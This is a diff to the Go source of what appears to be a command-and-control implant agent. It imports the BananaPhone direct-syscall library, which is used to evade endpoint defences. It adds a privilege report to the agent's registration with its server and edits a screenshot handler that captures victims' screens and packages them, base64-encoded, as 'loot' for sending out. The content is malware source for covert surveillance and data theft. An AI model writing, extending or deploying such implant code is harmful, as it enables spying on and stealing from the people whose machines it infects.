@@ -23,10 +23,11 @@ import (
 	"time"
 	"unsafe"
 
+	"image/png"
+
 	"github.com/google/uuid"
 	"github.com/quic-go/quic-go/http3"
 	"golang.org/x/sys/windows"
-	"image/png"
 
 	bananaphone "github.com/C-Sto/BananaPhone/pkg/BananaPhone"
 	"github.com/kbinani/screenshot"
@@ -128,6 +129,7 @@ type AgentRegistration struct {
 	IP                string `json:"ip"`
 	OS                string `json:"os"`
 	ReconnectInterval int    `json:"reconnectInterval"`
+	Privileges        string `json:"privileges"`
 }
 
 type Command struct {
@@ -283,6 +285,7 @@ func main() {
 			IP:                getLocalIP(),
 			OS:                osInfo,
 			ReconnectInterval: reconnectInterval,
+			Privileges:        getPrivilegeInfo(),
 		}
 
 		if err := registerAgent(reg); err != nil {
@@ -1268,25 +1271,25 @@ func handleScreenshot(args []string) (string, error) {
 		var buffer strings.Builder
 		pngEncoder := png.Encoder{CompressionLevel: png.DefaultCompression}
 		bufWriter := &bufferWriter{builder: &buffer}
-		
+
 		if err := pngEncoder.Encode(bufWriter, img); err != nil {
 			continue
 		}
 
 		// Get the raw bytes
 		imageBytes := []byte(buffer.String())
-		
+
 		// Calculate MD5 hash
 		hash := md5.Sum(imageBytes)
 		hashString := hex.EncodeToString(hash[:])
-		
+
 		// Generate filename with timestamp
 		timestamp := time.Now().Unix()
 		filename := fmt.Sprintf("screenshot_%d_%d.png", timestamp, i)
-		
+
 		// Base64 encode the image
 		base64Content := base64.StdEncoding.EncodeToString(imageBytes)
-		
+
 		// Create loot entry
 		lootEntry := map[string]interface{}{
 			"type":    "file",
@@ -1296,7 +1299,7 @@ func handleScreenshot(args []string) (string, error) {
 			"content": base64Content,
 			"md5":     hashString,
 		}
-		
+
 		lootEntries = append(lootEntries, lootEntry)
 		result.WriteString(fmt.Sprintf("Captured screen %d (%d bytes)\n", i, len(imageBytes)))
 	}
